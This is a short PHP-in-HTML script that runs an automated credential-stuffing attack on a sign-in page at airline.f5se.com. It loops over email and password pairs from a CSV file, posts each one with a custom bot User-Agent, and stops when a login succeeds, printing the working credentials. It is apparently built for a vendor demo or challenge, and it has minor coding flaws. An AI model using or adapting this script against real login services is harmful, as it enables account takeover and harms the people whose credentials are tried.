
<html>
<body>


<div id="print">

</div>

<?php


$url = 'https://airline.f5se.com/user/vipsignin';
$i=0;


$fn = fopen("challenge_vip_demo.csv","r");

$ch = curl_init();

while(! feof($fn)) {
    echo '<br><br>';
    $i++;
    $line = fgets($fn);


    $line = trim($line);

    $strArrMain = (explode(",", $line));


    $userid = trim($strArrMain[0]);
    $password = trim($strArrMain[3]);
    $userid=trim($userid);
    $password=trim($password);


     $userid=urlencode($userid);
     $password=urlencode($password);



    $post="email=".$userid."&password=".$password;





    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded, Host:airline.f5se.com, User-Agent: marcelbotheader'));


    if(curl_exec($ch) === false)
    {
        echo 'Curl error: ' . curl_error($ch);
    }
    $errors = curl_error($ch);
    $result = curl_exec($ch);
    $returnCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    echo $result;


    if(strpos($result, 'Index'))
    {

        echo 'Success <br>';
        echo $post;
        break;
    }



}









fclose($fn);

?>


</body>
</html>
